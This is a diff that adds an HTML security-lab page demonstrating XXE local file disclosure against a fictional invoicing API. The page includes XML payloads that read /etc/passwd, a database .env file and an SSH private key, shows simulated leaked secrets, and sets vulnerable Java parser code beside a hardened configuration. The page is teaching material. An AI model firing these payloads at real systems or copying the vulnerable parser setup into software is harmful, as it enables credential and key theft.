@@ -1,0 +1,1061 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🗂️ Security Lab: XXE Local File Disclosure & Secret Extraction Demo</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&family=Poppins:wght@600;700;800&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg: #0b0f19;
+    --panel: #111827;
+    --panel-2: #1f2937;
+    --border: #374151;
+    --accent: #f59e0b;
+    --danger: #ef4444;
+    --safe: #10b981;
+    --blue: #3b82f6;
+    --purple: #a855f7;
+    --cyan: #06b6d4;
+    --text: #f9fafb;
+    --text-muted: #9ca3af;
+    --mono: 'IBM Plex Mono', monospace;
+    --sans: 'IBM Plex Sans', system-ui, sans-serif;
+  }
+
+  body {
+    font-family: var(--sans);
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    overflow-x: hidden;
+    line-height: 1.6;
+  }
+
+  /* ── Dynamic Cyber Background ── */
+  .cyber-bg {
+    position: fixed; inset: 0; pointer-events: none; z-index: 0; overflow: hidden;
+  }
+  .cyber-grid {
+    position: absolute; inset: -120px;
+    background-image: 
+      radial-gradient(rgba(255, 255, 255, 0.12) 1.2px, transparent 1.2px),
+      linear-gradient(rgba(99, 102, 241, 0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(99, 102, 241, 0.03) 1px, transparent 1px);
+    background-size: 32px 32px, 96px 96px, 96px 96px;
+    opacity: 0.85;
+    animation: gridDrift 60s linear infinite;
+  }
+  @keyframes gridDrift {
+    0% { transform: translate(0, 0); }
+    100% { transform: translate(96px, 96px); }
+  }
+  .cyber-orb {
+    position: absolute; border-radius: 50%; filter: blur(100px); opacity: 0.35; will-change: transform;
+  }
+  .orb-1 { width: 600px; height: 600px; background: radial-gradient(circle, #3b82f6 0%, rgba(59,130,246,0) 70%); top: -100px; left: -100px; animation: floatOrb1 16s ease-in-out infinite alternate; }
+  .orb-2 { width: 650px; height: 650px; background: radial-gradient(circle, #ef4444 0%, rgba(239,68,68,0) 70%); bottom: -100px; right: -120px; animation: floatOrb2 20s ease-in-out infinite alternate; }
+  .orb-3 { width: 500px; height: 500px; background: radial-gradient(circle, #a855f7 0%, rgba(168,85,247,0) 70%); top: 35%; right: 20%; animation: floatOrb3 18s ease-in-out infinite alternate; }
+  .orb-4 { width: 550px; height: 550px; background: radial-gradient(circle, #06b6d4 0%, rgba(6,182,212,0) 70%); bottom: 10%; left: 15%; animation: floatOrb4 22s ease-in-out infinite alternate; }
+  @keyframes floatOrb1 { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(-60px, 140px) scale(0.92); } }
+  @keyframes floatOrb2 { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(-80px, -70px) scale(0.9); } }
+  @keyframes floatOrb3 { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(-100px, -50px) scale(1.05); } }
+  @keyframes floatOrb4 { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(90px, 70px) scale(0.9); } }
+
+  /* ── Layout ── */
+  .container {
+    max-width: 1380px;
+    margin: 0 auto;
+    padding: 24px 20px 60px;
+    position: relative;
+    z-index: 1;
+  }
+
+  /* ── Header ── */
+  .header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 16px;
+    padding-bottom: 24px;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 30px;
+  }
+  .header-left {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }
+  .back-link {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 8px 16px;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    color: var(--text-muted);
+    font-family: var(--mono);
+    font-size: 13px;
+    text-decoration: none;
+    transition: all 0.2s;
+  }
+  .back-link:hover {
+    color: var(--text);
+    border-color: var(--accent);
+    transform: translateX(-3px);
+  }
+  .header-title h1 {
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--text);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .header-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 4px 10px;
+    background: rgba(239, 68, 68, 0.15);
+    border: 1px solid rgba(239, 68, 68, 0.35);
+    border-radius: 20px;
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--danger);
+    font-weight: 600;
+  }
+
+  /* ── Moving Interactive Pipeline Stream (Visual Motion) ── */
+  .flow-stream-bar {
+    background: rgba(17, 24, 39, 0.7);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 12px 18px;
+    margin-bottom: 24px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    position: relative;
+    overflow: hidden;
+  }
+  .flow-stream-bar::after {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 60%; height: 2px;
+    background: linear-gradient(90deg, transparent, #38bdf8, #ef4444, transparent);
+    animation: pipelineLaser 3s linear infinite;
+  }
+  @keyframes pipelineLaser {
+    0% { left: -60%; }
+    100% { left: 140%; }
+  }
+
+  .flow-step-item {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--text-muted);
+    transition: all 0.3s;
+  }
+  .flow-step-item.active {
+    color: #38bdf8;
+    text-shadow: 0 0 10px rgba(56, 189, 248, 0.4);
+  }
+  .flow-step-item.attacked {
+    color: #f87171;
+    text-shadow: 0 0 10px rgba(239, 68, 68, 0.6);
+  }
+  .flow-dot-pulse {
+    width: 8px; height: 8px; border-radius: 50%;
+    background: #3b82f6;
+    animation: dotPulse 1.5s infinite alternate;
+  }
+  .flow-step-item.attacked .flow-dot-pulse {
+    background: #ef4444;
+    animation: dotPulseRed 0.8s infinite alternate;
+  }
+  @keyframes dotPulse {
+    0% { transform: scale(0.8); opacity: 0.5; }
+    100% { transform: scale(1.4); opacity: 1; box-shadow: 0 0 8px #3b82f6; }
+  }
+  @keyframes dotPulseRed {
+    0% { transform: scale(0.8); opacity: 0.6; }
+    100% { transform: scale(1.6); opacity: 1; box-shadow: 0 0 12px #ef4444; }
+  }
+  .flow-connector {
+    color: #4b5563;
+    font-weight: 700;
+    font-size: 13px;
+  }
+
+  /* ── Dual Window Simulation Grid ── */
+  .sim-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 24px;
+    margin-bottom: 40px;
+  }
+  @media (max-width: 1024px) {
+    .sim-grid { grid-template-columns: 1fr; }
+  }
+
+  /* ── Window Wrapper ── */
+  .window {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    overflow: hidden;
+    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+    display: flex;
+    flex-direction: column;
+    transition: border-color 0.3s;
+  }
+  .window-header {
+    background: var(--panel-2);
+    padding: 12px 18px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    border-bottom: 1px solid var(--border);
+  }
+  .window-controls {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .win-dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dot-red { background: #ef4444; }
+  .dot-yellow { background: #f59e0b; }
+  .dot-green { background: #10b981; }
+  .window-title {
+    font-family: var(--mono);
+    font-size: 12.5px;
+    color: var(--text-muted);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .window-body {
+    padding: 22px;
+    flex: 1;
+  }
+
+  /* ── Left Window: Attacker Exploit Console ── */
+  .attacker-bar {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    background: rgba(239, 68, 68, 0.1);
+    border: 1px solid rgba(239, 68, 68, 0.3);
+    border-radius: 8px;
+    padding: 10px 14px;
+    margin-bottom: 18px;
+    font-family: var(--mono);
+    font-size: 12px;
+  }
+  .attacker-text { color: #fca5a5; display: flex; align-items: center; gap: 8px; }
+  .attacker-role {
+    background: rgba(239, 68, 68, 0.2);
+    padding: 2px 8px;
+    border-radius: 4px;
+    color: #f87171;
+  }
+
+  .preset-group {
+    margin-bottom: 16px;
+  }
+  .preset-label {
+    font-family: var(--mono);
+    font-size: 11.5px;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    margin-bottom: 8px;
+    display: block;
+  }
+  .preset-btns {
+    display: grid;
+    grid-template-columns: 1fr;
+    gap: 7px;
+  }
+  .preset-btn {
+    background: var(--panel-2);
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 8px 12px;
+    border-radius: 6px;
+    font-family: var(--mono);
+    font-size: 12px;
+    cursor: pointer;
+    text-align: left;
+    transition: all 0.2s;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .preset-btn:hover {
+    border-color: var(--blue);
+    background: rgba(59, 130, 246, 0.08);
+  }
+  .preset-btn.active {
+    border-color: var(--danger);
+    background: rgba(239, 68, 68, 0.15);
+    color: #fca5a5;
+  }
+  .preset-tag {
+    font-size: 10px;
+    padding: 2px 6px;
+    border-radius: 4px;
+    background: rgba(255, 255, 255, 0.06);
+    color: var(--text-muted);
+  }
+  .preset-btn.active .preset-tag {
+    background: rgba(239, 68, 68, 0.25);
+    color: #fca5a5;
+  }
+
+  /* XML Code Editor */
+  .editor-wrap {
+    background: #060912;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    margin-bottom: 18px;
+    overflow: hidden;
+  }
+  .editor-header {
+    background: #0e1626;
+    padding: 8px 12px;
+    font-family: var(--mono);
+    font-size: 11.5px;
+    color: #94a3b8;
+    display: flex;
+    justify-content: space-between;
+    border-bottom: 1px solid var(--border);
+  }
+  .xml-textarea {
+    width: 100%;
+    height: 190px;
+    background: transparent;
+    border: none;
+    color: #38bdf8;
+    font-family: var(--mono);
+    font-size: 12px;
+    line-height: 1.5;
+    padding: 12px;
+    outline: none;
+    resize: none;
+  }
+
+  .action-row {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 16px;
+  }
+  .btn-fire {
+    flex: 2;
+    background: linear-gradient(135deg, #ef4444, #b91c1c);
+    color: #fff;
+    border: none;
+    padding: 11px 16px;
+    border-radius: 8px;
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 700;
+    cursor: pointer;
+    box-shadow: 0 4px 15px rgba(239, 68, 68, 0.35);
+    transition: all 0.2s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+  }
+  .btn-fire:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(239, 68, 68, 0.5);
+  }
+  .btn-reset {
+    flex: 1;
+    background: var(--panel-2);
+    border: 1px solid var(--border);
+    color: var(--text-muted);
+    padding: 11px 14px;
+    border-radius: 8px;
+    font-family: var(--mono);
+    font-size: 12px;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .btn-reset:hover {
+    color: var(--text);
+    border-color: var(--text-muted);
+  }
+
+  .status-log-box {
+    background: #050810;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 10px 12px;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: #a3e635;
+    min-height: 48px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  /* ── Right Window: Target Application & File Reflection ── */
+  .alert-banner {
+    padding: 12px 16px;
+    border-radius: 8px;
+    margin-bottom: 20px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    font-family: var(--mono);
+    font-size: 12.5px;
+    font-weight: 600;
+    transition: all 0.3s;
+  }
+  .alert-normal {
+    background: rgba(16, 185, 129, 0.12);
+    border: 1px solid rgba(16, 185, 129, 0.3);
+    color: #34d399;
+  }
+  .alert-leaked {
+    background: rgba(239, 68, 68, 0.18);
+    border: 1px solid rgba(239, 68, 68, 0.45);
+    color: #f87171;
+    animation: alertPulse 1.5s infinite alternate;
+  }
+  @keyframes alertPulse {
+    0% { box-shadow: 0 0 10px rgba(239, 68, 68, 0.1); }
+    100% { box-shadow: 0 0 25px rgba(239, 68, 68, 0.35); }
+  }
+
+  /* File metadata header */
+  .file-meta-bar {
+    background: var(--panel-2);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 10px 14px;
+    margin-bottom: 14px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-family: var(--mono);
+    font-size: 11.5px;
+  }
+  .file-target-tag {
+    color: #f59e0b;
+    font-weight: 700;
+  }
+
+  /* Animated Terminal Display for Exfiltrated Files */
+  .terminal-box {
+    background: #05070e;
+    border: 1px solid #1e293b;
+    border-radius: 8px;
+    padding: 14px;
+    min-height: 230px;
+    max-height: 290px;
+    overflow-y: auto;
+    font-family: var(--mono);
+    font-size: 11.5px;
+    line-height: 1.6;
+    color: #a3e635;
+    position: relative;
+  }
+  .term-cursor {
+    display: inline-block;
+    width: 7px;
+    height: 14px;
+    background: #a3e635;
+    vertical-align: middle;
+    margin-left: 4px;
+    animation: blinkCursor 0.9s step-end infinite;
+  }
+  @keyframes blinkCursor {
+    50% { opacity: 0; }
+  }
+
+  /* Radar / Waveform animation on server status */
+  .parser-heartbeat {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    background: #080c14;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 8px 12px;
+    margin-top: 14px;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: #94a3b8;
+  }
+  .wave-bars {
+    display: flex;
+    align-items: flex-end;
+    gap: 3px;
+    height: 14px;
+  }
+  .wave-bar {
+    width: 3px;
+    background: #3b82f6;
+    border-radius: 1px;
+    animation: waveBounce 1s ease-in-out infinite alternate;
+  }
+  .wave-bar:nth-child(2) { animation-delay: 0.2s; }
+  .wave-bar:nth-child(3) { animation-delay: 0.4s; }
+  .wave-bar:nth-child(4) { animation-delay: 0.6s; }
+  @keyframes waveBounce {
+    0% { height: 3px; }
+    100% { height: 14px; background: #ef4444; }
+  }
+
+  /* ── Bottom Section: Technical Breakdown & Code Comparison ── */
+  .edu-section {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    padding: 30px;
+    margin-top: 30px;
+  }
+  .edu-head {
+    margin-bottom: 24px;
+  }
+  .edu-head h2 {
+    font-size: 19px;
+    color: var(--text);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 6px;
+  }
+  .edu-head p {
+    color: var(--text-muted);
+    font-size: 14px;
+  }
+
+  .code-comparison {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+    margin-top: 20px;
+  }
+  @media (max-width: 900px) {
+    .code-comparison { grid-template-columns: 1fr; }
+  }
+  .code-pane {
+    background: #080c14;
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    overflow: hidden;
+  }
+  .code-pane.vulnerable { border-left: 4px solid var(--danger); }
+  .code-pane.secure { border-left: 4px solid var(--safe); }
+  .code-title {
+    padding: 10px 14px;
+    background: rgba(255, 255, 255, 0.03);
+    border-bottom: 1px solid var(--border);
+    font-family: var(--mono);
+    font-size: 12px;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .code-title.vulnerable { color: #f87171; }
+  .code-title.secure { color: #34d399; }
+  .code-pane pre {
+    padding: 14px;
+    font-family: var(--mono);
+    font-size: 12px;
+    line-height: 1.6;
+    color: #e2e8f0;
+    overflow-x: auto;
+  }
+
+  /* ── Designed and Developed by Footer ── */
+  .modern-footer { padding: 40px 18px 30px; text-align: center; position: relative; z-index: 1; }
+  .footer-badge {
+    display: inline-flex; align-items: center; gap: 10px;
+    background: linear-gradient(145deg, var(--panel-2), var(--panel));
+    padding: 12px 28px; border-radius: 30px; font-family: var(--mono); font-size: 13.5px;
+    color: var(--text-muted); border: 1px solid var(--border);
+    transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    box-shadow: 0 8px 25px rgba(0,0,0,0.25); cursor: default;
+  }
+  .footer-badge:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 12px 30px rgba(239, 68, 68, 0.25);
+    border-color: var(--danger);
+    color: var(--text);
+  }
+  .dev-name {
+    font-family: 'Poppins', sans-serif;
+    font-weight: 700;
+    font-size: 1.05rem;
+    background: linear-gradient(90deg, #3B82F6, #A855F7, #F43F5E, #F59E0B, #3B82F6);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    background-size: 200% auto;
+    animation: gradient-flow 4s linear infinite;
+  }
+  @keyframes gradient-flow {
+    0% { background-position: 0% center; }
+    100% { background-position: 200% center; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Dynamic Cyber Background -->
+<div class="cyber-bg" aria-hidden="true">
+  <div class="cyber-orb orb-1"></div>
+  <div class="cyber-orb orb-2"></div>
+  <div class="cyber-orb orb-3"></div>
+  <div class="cyber-orb orb-4"></div>
+  <div class="cyber-grid"></div>
+</div>
+
+<div class="container">
+
+  <!-- Header -->
+  <header class="header">
+    <div class="header-left">
+      <a href="../guides/XXE.html" class="back-link">← Back to XXE Notes</a>
+      <div class="header-title">
+        <h1>🗂️ XXE Local File Disclosure & Secret Extraction Lab</h1>
+      </div>
+    </div>
+    <div class="header-badge">
+      <span>● ACTIVE LAB</span>
+    </div>
+  </header>
+
+  <!-- Moving Interactive Pipeline Stream -->
+  <div class="flow-stream-bar" id="pipeline-stream">
+    <div class="flow-step-item active" id="step-client">
+      <span class="flow-dot-pulse"></span>
+      <span>1. Attacker XML Input</span>
+    </div>
+    <span class="flow-connector">➔</span>
+    <div class="flow-step-item" id="step-parser">
+      <span class="flow-dot-pulse"></span>
+      <span>2. DTD Parser & Lexer</span>
+    </div>
+    <span class="flow-connector">➔</span>
+    <div class="flow-step-item" id="step-entity">
+      <span class="flow-dot-pulse"></span>
+      <span>3. Entity Expansion: &amp;xxe;</span>
+    </div>
+    <span class="flow-connector">➔</span>
+    <div class="flow-step-item" id="step-file">
+      <span class="flow-dot-pulse"></span>
+      <span>4. OS File System Access</span>
+    </div>
+    <span class="flow-connector">➔</span>
+    <div class="flow-step-item" id="step-resp">
+      <span class="flow-dot-pulse"></span>
+      <span>5. Reflected Response</span>
+    </div>
+  </div>
+
+  <!-- Dual Simulation Windows -->
+  <div class="sim-grid">
+
+    <!-- Left: Attacker Exploit Console -->
+    <div class="window">
+      <div class="window-header">
+        <div class="window-controls">
+          <span class="win-dot dot-red"></span>
+          <span class="win-dot dot-yellow"></span>
+          <span class="win-dot dot-green"></span>
+        </div>
+        <div class="window-title">
+          <span>⚡ Attacker Exploit Console (Burp Suite XML Repeater)</span>
+        </div>
+      </div>
+      <div class="window-body">
+
+        <!-- Attacker Session -->
+        <div class="attacker-bar">
+          <span class="attacker-text">
+            <span>👤 External Attacker:</span>
+            <strong>Om bobde</strong>
+          </span>
+          <span class="attacker-role">Target: ApexPay Invoicing API</span>
+        </div>
+
+        <!-- Presets -->
+        <div class="preset-group">
+          <span class="preset-label">🎯 Select Payload (File Disclosure Target):</span>
+          <div class="preset-btns">
+            <button class="preset-btn active" id="p-legit" onclick="selectPreset('legit')">
+              <span>📄 Legitimate Business Invoice</span>
+              <span class="preset-tag">SAFE</span>
+            </button>
+            <button class="preset-btn" id="p-passwd" onclick="selectPreset('passwd')">
+              <span>🚨 Read /etc/passwd (System User List)</span>
+              <span class="preset-tag" style="color:#fca5a5;">SYSTEM FILE</span>
+            </button>
+            <button class="preset-btn" id="p-db" onclick="selectPreset('db')">
+              <span>🔑 Read /app/config/database.env (DB Passwords)</span>
+              <span class="preset-tag" style="color:#fca5a5;">Bhavesh Singh DB</span>
+            </button>
+            <button class="preset-btn" id="p-ssh" onclick="selectPreset('ssh')">
+              <span>🗝️ Read /home/irshad_akram/.ssh/id_rsa (Private Key)</span>
+              <span class="preset-tag" style="color:#fca5a5;">Irshad Akram SSH</span>
+            </button>
+          </div>
+        </div>
+
+        <!-- XML Editor -->
+        <div class="editor-wrap">
+          <div class="editor-header">
+            <span>POST /v1/process-invoice-xml (Content-Type: application/xml)</span>
+            <span style="color:#f59e0b;">DTD Injection Enabled</span>
+          </div>
+          <textarea id="xml-editor" class="xml-textarea" spellcheck="false"></textarea>
+        </div>
+
+        <!-- Action Buttons -->
+        <div class="action-row">
+          <button class="btn-fire" onclick="fireXxePayload()">
+            <span>⚡ Fire XXE Payload</span>
+          </button>
+          <button class="btn-reset" onclick="resetLab()">
+            <span>↺ Reset Lab</span>
+          </button>
+        </div>
+
+        <!-- Status Log -->
+        <div class="status-log-box" id="status-log">
+          <span>🟢</span>
+          <span id="log-text">Ready. Standard XML parser initialized.</span>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- Right: Server Response & Leaked File View -->
+    <div class="window">
+      <div class="window-header">
+        <div class="window-controls">
+          <span class="win-dot dot-red"></span>
+          <span class="win-dot dot-yellow"></span>
+          <span class="win-dot dot-green"></span>
+        </div>
+        <div class="window-title">
+          <span>🖥️ ApexPay Backend Server & File Reflection</span>
+        </div>
+      </div>
+      <div class="window-body">
+
+        <!-- Security Status Banner -->
+        <div class="alert-banner alert-normal" id="sec-banner">
+          <span id="banner-icon">🟢</span>
+          <span id="banner-text">NORMAL OPERATION: Safe invoice receipt rendered.</span>
+        </div>
+
+        <!-- File Metadata Header -->
+        <div class="file-meta-bar">
+          <span>Target Resource: <span class="file-target-tag" id="target-filename">Regular Business Note</span></span>
+          <span style="color:#60a5fa;" id="target-mode">Status: 200 OK</span>
+        </div>
+
+        <!-- Animated Terminal Display -->
+        <div class="terminal-box" id="term-box">
+          <div id="term-output"></div>
+          <span class="term-cursor" id="term-cursor"></span>
+        </div>
+
+        <!-- Live Parser Activity Heartbeat (Movement Element) -->
+        <div class="parser-heartbeat">
+          <div class="wave-bars">
+            <span class="wave-bar"></span>
+            <span class="wave-bar"></span>
+            <span class="wave-bar"></span>
+            <span class="wave-bar"></span>
+          </div>
+          <span id="heartbeat-text">libxml2 engine active · DTD Entity Resolution: ENABLED</span>
+        </div>
+
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Bottom Educational Section -->
+  <section class="edu-section">
+    <div class="edu-head">
+      <h2>🛡️ Technical Root Cause & Secure Parser Configuration</h2>
+      <p>Why default XML parsers resolve external entities and how engineering teams permanently neutralize XXE.</p>
+    </div>
+
+    <div class="code-comparison">
+      <!-- Vulnerable Code -->
+      <div class="code-pane vulnerable">
+        <div class="code-title vulnerable">
+          <span>❌ Vulnerable Backend (Default Parser Settings)</span>
+          <span>Java / DocumentBuilderFactory</span>
+        </div>
+        <pre><code>// ❌ Fatal Flaw: External DTDs & Entities Allowed by Default!
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+
+// 🚨 When an XML contains &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;,
+// the parser resolves the file path, reads file contents from the host disk,
+// and substitutes it directly into the document tree!
+DocumentBuilder builder = dbf.newDocumentBuilder();
+Document doc = builder.parse(new InputSource(new StringReader(xmlPayload)));
+
+String noteContent = doc.getElementsByTagName("notes").item(0).getTextContent();
+return ResponseEntity.ok("Invoice Processed: " + noteContent);</code></pre>
+      </div>
+
+      <!-- Secure Code -->
+      <div class="code-pane secure">
+        <div class="code-title secure">
+          <span>✅ Secure Backend (Disallow DOCTYPE Completely)</span>
+          <span>Java / DocumentBuilderFactory</span>
+        </div>
+        <pre><code>DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+
+// ✅ 1. Completely forbid DOCTYPE declarations (OWASP Top Recommendation)
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+
+// ✅ 2. Defense-in-depth: Disable external general and parameter entities
+dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
+dbf.setXIncludeAware(false);
+dbf.setExpandEntityReferences(false);
+
+DocumentBuilder builder = dbf.newDocumentBuilder();
+// Parsers now immediately reject malicious DOCTYPEs!</code></pre>
+      </div>
+    </div>
+  </section>
+
+  <!-- Footer -->
+  <footer class="modern-footer">
+    <div class="footer-badge">
+      <span class="footer-text">Designed and developed by <strong class="dev-name">Irshad Akaram</strong></span>
+    </div>
+  </footer>
+
+</div>
+
+<script>
+const payloads = {
+  "legit": {
+    target: "Legitimate Business Invoice",
+    mode: "Mode: Normal Invoicing",
+    isAttack: false,
+    xml: `<?xml version="1.0" encoding="UTF-8"?>
+<invoice>
+  <id>INV-9821</id>
+  <client>Shabaj Ansari</client>
+  <amount>₹50,000</amount>
+  <notes>Payment due in 30 days. Thank you for your business.</notes>
+</invoice>`,
+    content: `[ApexPay Invoice Processing Service]
+Status: SUCCESS (HTTP 200 OK)
+Invoice ID: INV-9821
+Client Name: Shabaj Ansari (CFO)
+Billed Amount: ₹50,000.00
+Processed Notes: "Payment due in 30 days. Thank you for your business."
+Verification: Valid XML schema, no external entity substitutions.`
+  },
+  "passwd": {
+    target: "file:///etc/passwd",
+    mode: "🚨 CRITICAL FILE LEAK",
+    isAttack: true,
+    xml: `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE invoice [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<invoice>
+  <id>INV-9821</id>
+  <client>Om bobde</client>
+  <amount>₹50,000</amount>
+  <notes>&xxe;</notes>
+</invoice>`,
+    content: `root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+irshad_akram:x:1001:1001:Irshad Akram (Lead Dev):/home/irshad_akram:/bin/bash
+mohammad_asif:x:1002:1002:Mohammad Asif (Security):/home/mohammad_asif:/bin/bash
+shabaj_ansari:x:1003:1003:Shabaj Ansari (Finance):/home/shabaj_ansari:/bin/bash
+bhavesh_singh:x:1004:1004:Bhavesh Singh (DB Admin):/home/bhavesh_singh:/bin/bash`
+  },
+  "db": {
+    target: "file:///app/config/database.env",
+    mode: "🚨 DATABASE CREDENTIALS LEAKED",
+    isAttack: true,
+    xml: `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE invoice [
+  <!ENTITY xxe SYSTEM "file:///app/config/database.env">
+]>
+<invoice>
+  <id>INV-9821</id>
+  <client>Om bobde</client>
+  <amount>₹50,000</amount>
+  <notes>&xxe;</notes>
+</invoice>`,
+    content: `DB_HOST=internal-db-cluster.apexpay.local
+DB_PORT=5432
+DB_NAME=apexpay_production_ledger
+DB_USER=bhavesh_singh_dbadmin
+DB_PASS=Bhavesh#MasterPass2026!ProdCluster
+AWS_KMS_KEY_ID=arn:aws:kms:us-east-1:112233445566:key/apexpay-master
+JWT_SIGNING_SECRET=AkramProductionKey99281!SecurityAuditedByAsif`
+  },
+  "ssh": {
+    target: "file:///home/irshad_akram/.ssh/id_rsa",
+    mode: "🚨 ROOT SSH PRIVATE KEY EXFILTRATED",
+    isAttack: true,
+    xml: `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE invoice [
+  <!ENTITY xxe SYSTEM "file:///home/irshad_akram/.ssh/id_rsa">
+]>
+<invoice>
+  <id>INV-9821</id>
+  <client>Om bobde</client>
+  <amount>₹50,000</amount>
+  <notes>&xxe;</notes>
+</invoice>`,
+    content: `-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAr84IrshadAkramMasterKey991bAKjlOq198zAKlP...
+[TRUNCATED PRIVATE RSA KEY - 2048 BITS]
+...xKql88ZAkramRootInfrastructureAccessKeyApexPayProdCluster==
+-----END OPENSSH PRIVATE KEY-----`
+  }
+};
+
+let currentKey = "legit";
+let typeTimer = null;
+
+function selectPreset(key) {
+  currentKey = key;
+  const p = payloads[key];
+  if (!p) return;
+
+  document.getElementById('xml-editor').value = p.xml;
+
+  ['legit', 'passwd', 'db', 'ssh'].forEach(k => {
+    const btn = document.getElementById(`p-${k}`);
+    if (btn) btn.classList.toggle('active', k === key);
+  });
+
+  animatePipeline(p);
+}
+
+function animatePipeline(p) {
+  const steps = ['step-client', 'step-parser', 'step-entity', 'step-file', 'step-resp'];
+  steps.forEach((sId, i) => {
+    const el = document.getElementById(sId);
+    el.className = "flow-step-item";
+    setTimeout(() => {
+      if (p.isAttack) {
+        el.className = "flow-step-item attacked";
+      } else {
+        el.className = "flow-step-item active";
+      }
+    }, i * 150);
+  });
+
+  setTimeout(() => {
+    renderOutput(p);
+  }, 750);
+}
+
+function renderOutput(p) {
+  const banner = document.getElementById('sec-banner');
+  const bannerIcon = document.getElementById('banner-icon');
+  const bannerText = document.getElementById('banner-text');
+  const filenameEl = document.getElementById('target-filename');
+  const modeEl = document.getElementById('target-mode');
+  const logBox = document.getElementById('status-log');
+  const logText = document.getElementById('log-text');
+  const heartbeatText = document.getElementById('heartbeat-text');
+
+  filenameEl.textContent = p.target;
+  modeEl.textContent = p.mode;
+
+  if (!p.isAttack) {
+    banner.className = "alert-banner alert-normal";
+    bannerIcon.textContent = "🟢";
+    bannerText.textContent = "NORMAL OPERATION: Safe invoice receipt rendered.";
+    logBox.style.color = "#a3e635";
